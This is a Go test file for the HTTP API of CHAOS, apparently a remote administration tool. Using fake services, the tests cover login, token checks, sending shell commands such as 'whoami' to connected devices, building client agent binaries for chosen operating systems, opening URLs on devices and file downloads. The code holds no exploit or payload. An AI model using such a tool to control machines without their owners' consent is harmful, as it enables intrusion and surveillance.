package http

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
	"github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/entities"
	"github.com/tiagorlampert/CHAOS/internal"
	"github.com/tiagorlampert/CHAOS/internal/environment"
	"github.com/tiagorlampert/CHAOS/internal/middleware"
	"github.com/tiagorlampert/CHAOS/internal/utils"
	jwtUtil "github.com/tiagorlampert/CHAOS/internal/utils/jwt"
	"github.com/tiagorlampert/CHAOS/internal/utils/system"
	"github.com/tiagorlampert/CHAOS/repositories"
	"github.com/tiagorlampert/CHAOS/services/client"
	"github.com/tiagorlampert/CHAOS/services/user"
)

const testSecret = "test-secret"

type fakeAuthService struct{}

func (fakeAuthService) GetSecret() (string, error)     { return testSecret, nil }
func (fakeAuthService) RefreshSecret() (string, error) { return testSecret, nil }
func (fakeAuthService) GetAuthConfig() (*entities.Auth, error) {
	return &entities.Auth{SecretKey: testSecret}, nil
}

type fakeUserService struct{ valid bool }

func (fakeUserService) Insert(entities.User) error                        { return nil }
func (fakeUserService) UpdatePassword(user.UpdateUserPasswordInput) error { return nil }
func (fakeUserService) CreateDefaultUser() error                          { return nil }
func (f fakeUserService) Login(username, password string) bool {
	return f.valid && username == "admin" && password == "admin"
}

type fakeClientService struct {
	output    client.SendCommandOutput
	sendErr   error
	buildName string
	buildErr  error
	lastInput client.SendCommandInput
	lastBuild client.BuildClientBinaryInput
}

func (f *fakeClientService) AddConnection(string, *websocket.Conn) error { return nil }
func (f *fakeClientService) GetConnection(string) (*websocket.Conn, bool) {
	return nil, false
}
func (f *fakeClientService) RemoveConnection(string) error { return nil }
func (f *fakeClientService) SendCommand(_ context.Context, input client.SendCommandInput) (client.SendCommandOutput, error) {
	f.lastInput = input
	return f.output, f.sendErr
}
func (f *fakeClientService) BuildClient(input client.BuildClientBinaryInput) (string, error) {
	f.lastBuild = input
	return f.buildName, f.buildErr
}

type fakeDeviceService struct {
	devices []entities.Device
	device  *entities.Device
	err     error
}

func (f *fakeDeviceService) Insert(entities.Device) error { return nil }
func (f *fakeDeviceService) FindAllConnected() ([]entities.Device, error) {
	return f.devices, f.err
}
func (f *fakeDeviceService) FindByMacAddress(string) (*entities.Device, error) {
	if f.device == nil {
		return nil, repositories.ErrNotFound
	}
	return f.device, f.err
}

type fakeUrlService struct {
	err     error
	address string
	url     string
}

func (f *fakeUrlService) OpenUrl(_ context.Context, address, rawUrl string) error {
	f.address = address
	f.url = rawUrl
	return f.err
}

func newTestAPI(t *testing.T, clientService *fakeClientService, deviceService *fakeDeviceService, urlService *fakeUrlService) *gin.Engine {
	t.Helper()
	gin.SetMode(gin.TestMode)

	router := gin.New()
	configuration := &environment.Configuration{Server: environment.Server{Port: "8080"}}
	jwtMiddleware := middleware.NewJwtMiddleware(fakeAuthService{}, fakeUserService{valid: true})

	NewController(
		configuration,
		router,
		logrus.New(),
		jwtMiddleware,
		clientService,
		fakeAuthService{},
		fakeUserService{valid: true},
		deviceService,
		urlService,
	)
	return router
}

func adminToken(t *testing.T) string {
	t.Helper()
	token, err := jwtUtil.NewToken(testSecret, jwtUtil.IdentityAdminUser)
	if err != nil {
		t.Fatal(err)
	}
	return token
}

func performRequest(router *gin.Engine, method, path, token, body string) *httptest.ResponseRecorder {
	var reader *bytes.Reader
	if len(body) > 0 {
		reader = bytes.NewReader([]byte(body))
	} else {
		reader = bytes.NewReader(nil)
	}

	request := httptest.NewRequest(method, path, reader)
	if len(body) > 0 {
		request.Header.Set("Content-Type", "application/json")
	}
	if len(token) > 0 {
		request.Header.Set("Authorization", "Bearer "+token)
	}

	recorder := httptest.NewRecorder()
	router.ServeHTTP(recorder, request)
	return recorder
}

func TestAPILoginAndBearerAuthentication(t *testing.T) {
	deviceService := &fakeDeviceService{
		devices: []entities.Device{{MacAddress: "AA:BB:CC:DD:EE:FF", Hostname: "host"}},
	}
	router := newTestAPI(t, &fakeClientService{}, deviceService, &fakeUrlService{})

	login := performRequest(router, http.MethodPost, "/api/v1/auth/login", "", `{"username":"admin","password":"admin"}`)
	if login.Code != http.StatusOK {
		t.Fatalf("login status = %d, want %d. Body: %s", login.Code, http.StatusOK, login.Body.String())
	}

	var loginBody struct {
		Token string `json:"token"`
	}
	if err := json.Unmarshal(login.Body.Bytes(), &loginBody); err != nil {
		t.Fatal(err)
	}
	if len(loginBody.Token) == 0 {
		t.Fatal("login response did not include a token")
	}

	devices := performRequest(router, http.MethodGet, "/api/v1/devices", loginBody.Token, "")
	if devices.Code != http.StatusOK {
		t.Fatalf("devices status = %d, want %d. Body: %s", devices.Code, http.StatusOK, devices.Body.String())
	}

	var devicesBody struct {
		Devices []apiDevice `json:"devices"`
	}
	if err := json.Unmarshal(devices.Body.Bytes(), &devicesBody); err != nil {
		t.Fatal(err)
	}
	if len(devicesBody.Devices) != 1 {
		t.Fatalf("devices count = %d, want 1", len(devicesBody.Devices))
	}
	if devicesBody.Devices[0].ClientID != "AA:BB:CC:DD:EE:FF" {
		t.Errorf("client_id = %q, want the raw MAC address", devicesBody.Devices[0].ClientID)
	}
	if devicesBody.Devices[0].Address != utils.EncodeBase64("AA:BB:CC:DD:EE:FF") {
		t.Errorf("address = %q, want its base64 representation", devicesBody.Devices[0].Address)
	}
}

func TestAPILoginRejectsInvalidCredentials(t *testing.T) {
	router := newTestAPI(t, &fakeClientService{}, &fakeDeviceService{}, &fakeUrlService{})

	response := performRequest(router, http.MethodPost, "/api/v1/auth/login", "", `{"username":"admin","password":"wrong"}`)
	if response.Code != http.StatusUnauthorized {
		t.Errorf("status = %d, want %d", response.Code, http.StatusUnauthorized)
	}
}

func TestAPIUnauthorizedReturnsJSON(t *testing.T) {
	router := newTestAPI(t, &fakeClientService{}, &fakeDeviceService{}, &fakeUrlService{})

	response := performRequest(router, http.MethodGet, "/api/v1/devices", "", "")
	if response.Code != http.StatusUnauthorized {
		t.Errorf("status = %d, want %d", response.Code, http.StatusUnauthorized)
	}
	if contentType := response.Header().Get("Content-Type"); contentType != "application/json; charset=utf-8" {
		t.Errorf("content type = %q, want JSON", contentType)
	}
}

func TestAPINonAdminIsForbidden(t *testing.T) {
	router := newTestAPI(t, &fakeClientService{}, &fakeDeviceService{}, &fakeUrlService{})

	token, err := jwtUtil.NewToken(testSecret, jwtUtil.IdentityDefaultUser)
	if err != nil {
		t.Fatal(err)
	}

	response := performRequest(router, http.MethodGet, "/api/v1/devices", token, "")
	if response.Code != http.StatusForbidden {
		t.Errorf("status = %d, want %d", response.Code, http.StatusForbidden)
	}
}

func TestAPIUnknownPathReturnsJSON(t *testing.T) {
	router := newTestAPI(t, &fakeClientService{}, &fakeDeviceService{}, &fakeUrlService{})

	response := performRequest(router, http.MethodGet, "/api/v1/unknown", adminToken(t), "")
	if response.Code != http.StatusNotFound {
		t.Errorf("status = %d, want %d", response.Code, http.StatusNotFound)
	}
}

func TestAPICommand(t *testing.T) {
	clientService := &fakeClientService{output: client.SendCommandOutput{Response: "output"}}
	router := newTestAPI(t, clientService, &fakeDeviceService{}, &fakeUrlService{})

	response := performRequest(
		router,
		http.MethodPost,
		"/api/v1/devices/"+utils.EncodeBase64("AA:BB:CC:DD:EE:FF")+"/commands",
		adminToken(t),
		`{"command":"whoami"}`,
	)
	if response.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d. Body: %s", response.Code, http.StatusOK, response.Body.String())
	}
	if clientService.lastInput.ClientID != "AA:BB:CC:DD:EE:FF" {
		t.Errorf("client id = %q, want the decoded MAC address", clientService.lastInput.ClientID)
	}
	if clientService.lastInput.Command != "whoami" {
		t.Errorf("command = %q, want %q", clientService.lastInput.Command, "whoami")
	}
}

func TestAPICommandFailureReturnsBadGateway(t *testing.T) {
	clientService := &fakeClientService{sendErr: context.DeadlineExceeded}
	router := newTestAPI(t, clientService, &fakeDeviceService{}, &fakeUrlService{})

	response := performRequest(
		router,
		http.MethodPost,
		"/api/v1/devices/AA:BB:CC:DD:EE:FF/commands",
		adminToken(t),
		`{"command":"whoami"}`,
	)
	if response.Code != http.StatusBadGateway {
		t.Errorf("status = %d, want %d", response.Code, http.StatusBadGateway)
	}
}

func TestAPICommandUnknownDeviceReturnsNotFound(t *testing.T) {
	clientService := &fakeClientService{output: client.SendCommandOutput{Response: internal.ErrClientConnectionNotFound.Error()}}
	router := newTestAPI(t, clientService, &fakeDeviceService{}, &fakeUrlService{})

	response := performRequest(
		router,
		http.MethodPost,
		"/api/v1/devices/AA:BB:CC:DD:EE:FF/commands",
		adminToken(t),
		`{"command":"whoami"}`,
	)
	if response.Code != http.StatusNotFound {
		t.Errorf("status = %d, want %d", response.Code, http.StatusNotFound)
	}
}

func TestAPICommandRequiresCommand(t *testing.T) {
	router := newTestAPI(t, &fakeClientService{}, &fakeDeviceService{}, &fakeUrlService{})

	response := performRequest(
		router,
		http.MethodPost,
		"/api/v1/devices/AA:BB:CC:DD:EE:FF/commands",
		adminToken(t),
		`{"parameter":"value"}`,
	)
	if response.Code != http.StatusBadRequest {
		t.Errorf("status = %d, want %d", response.Code, http.StatusBadRequest)
	}
}

func TestAPIListTargets(t *testing.T) {
	router := newTestAPI(t, &fakeClientService{}, &fakeDeviceService{}, &fakeUrlService{})

	response := performRequest(router, http.MethodGet, "/api/v1/targets", adminToken(t), "")
	if response.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", response.Code, http.StatusOK)
	}

	var body struct {
		Targets []apiTarget `json:"targets"`
	}
	if err := json.Unmarshal(response.Body.Bytes(), &body); err != nil {
		t.Fatal(err)
	}
	if len(body.Targets) != len(system.OSTargetIntMap) {
		t.Fatalf("targets count = %d, want %d", len(body.Targets), len(system.OSTargetIntMap))
	}

	found := false
	for _, target := range body.Targets {
		if target.GOOS != "darwin" {
			continue
		}
		found = true
		if target.Name != "Mac OS" {
			t.Errorf("target name = %q, want %q", target.Name, "Mac OS")
		}
		if len(target.Archs) != 2 {
			t.Errorf("darwin archs = %v, want amd64 and arm64", target.Archs)
		}
	}
	if !found {
		t.Error("darwin target was not returned")
	}
}

func TestAPIBuildClient(t *testing.T) {
	clientService := &fakeClientService{buildName: "agent"}
	router := newTestAPI(t, clientService, &fakeDeviceService{}, &fakeUrlService{})

	response := performRequest(
		router,
		http.MethodPost,
		"/api/v1/clients",
		adminToken(t),
		`{"server_address":"127.0.0.1","server_port":"8080","os_target":"macos","os_arch":"arm64","filename":"agent"}`,
	)
	if response.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d. Body: %s", response.Code, http.StatusOK, response.Body.String())
	}
	if clientService.lastBuild.OSTarget != system.Darwin {
		t.Errorf("os target = %v, want Darwin", clientService.lastBuild.OSTarget)
	}
	if clientService.lastBuild.OSArch != "arm64" {
		t.Errorf("os arch = %q, want %q", clientService.lastBuild.OSArch, "arm64")
	}
}

func TestAPIBuildClientNormalizesServerAddress(t *testing.T) {
	clientService := &fakeClientService{buildName: "agent"}
	router := newTestAPI(t, clientService, &fakeDeviceService{}, &fakeUrlService{})

	response := performRequest(
		router,
		http.MethodPost,
		"/api/v1/clients",
		adminToken(t),
		`{"server_address":"https://example.com:9443/","os_target":"linux"}`,
	)
	if response.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d. Body: %s", response.Code, http.StatusOK, response.Body.String())
	}
	if clientService.lastBuild.ServerAddress != "example.com" {
		t.Errorf("server address = %q, want %q", clientService.lastBuild.ServerAddress, "example.com")
	}
	if clientService.lastBuild.ServerPort != "9443" {
		t.Errorf("server port = %q, want %q", clientService.lastBuild.ServerPort, "9443")
	}
}

func TestAPIBuildClientRejectsInvalidTarget(t *testing.T) {
	router := newTestAPI(t, &fakeClientService{}, &fakeDeviceService{}, &fakeUrlService{})

	response := performRequest(
		router,
		http.MethodPost,
		"/api/v1/clients",
		adminToken(t),
		`{"server_address":"127.0.0.1","server_port":"8080","os_target":"plan9"}`,
	)
	if response.Code != http.StatusBadRequest {
		t.Errorf("status = %d, want %d", response.Code, http.StatusBadRequest)
	}
}

func TestAPIOpenUrl(t *testing.T) {
	urlService := &fakeUrlService{}
	router := newTestAPI(t, &fakeClientService{}, &fakeDeviceService{}, urlService)

	response := performRequest(
		router,
		http.MethodPost,
		"/api/v1/devices/AA:BB:CC:DD:EE:FF/open-url",
		adminToken(t),
		`{"url":"https://example.com"}`,
	)
	if response.Code != http.StatusNoContent {
		t.Fatalf("status = %d, want %d. Body: %s", response.Code, http.StatusNoContent, response.Body.String())
	}
	if urlService.address != "AA:BB:CC:DD:EE:FF" || urlService.url != "https://example.com" {
		t.Errorf("OpenUrl called with (%q, %q)", urlService.address, urlService.url)
	}
}

func TestAPIDownloadFileRequiresPath(t *testing.T) {
	router := newTestAPI(t, &fakeClientService{}, &fakeDeviceService{}, &fakeUrlService{})

	response := performRequest(router, http.MethodGet, "/api/v1/devices/AA:BB:CC:DD:EE:FF/files", adminToken(t), "")
	if response.Code != http.StatusBadRequest {
		t.Errorf("status = %d, want %d", response.Code, http.StatusBadRequest)
	}
}

func TestAPICORSHeaders(t *testing.T) {
	router := newTestAPI(t, &fakeClientService{}, &fakeDeviceService{}, &fakeUrlService{})

	response := performRequest(router, http.MethodGet, "/api/v1/health", "", "")
	if response.Code != http.StatusOK {
		t.Fatalf("status = %d, want %d", response.Code, http.StatusOK)
	}
	if origin := response.Header().Get("Access-Control-Allow-Origin"); origin != "*" {
		t.Errorf("allow origin = %q, want %q", origin, "*")
	}

	preflight := performRequest(router, http.MethodOptions, "/api/v1/devices", "", "")
	if preflight.Code != http.StatusNoContent {
		t.Errorf("preflight status = %d, want %d", preflight.Code, http.StatusNoContent)
	}
}
